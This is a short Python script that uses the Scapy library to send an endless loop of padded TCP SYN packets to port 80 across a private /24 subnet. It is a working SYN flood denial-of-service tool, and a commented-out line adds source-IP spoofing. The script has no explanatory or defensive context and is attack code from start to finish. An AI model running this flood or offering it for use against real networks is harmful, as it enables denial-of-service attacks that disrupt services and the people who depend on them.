from scapy.all import *

target_ip = "192.168.142.128/24"
target_port = 80

ip = IP(dst=target_ip)
#ip = IP(src=RandIP("192.168.142.128/24"), dst=target_ip)
tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
raw = Raw(b"X"*1024)
p = ip / tcp / raw
send(p, loop=1, verbose=0)
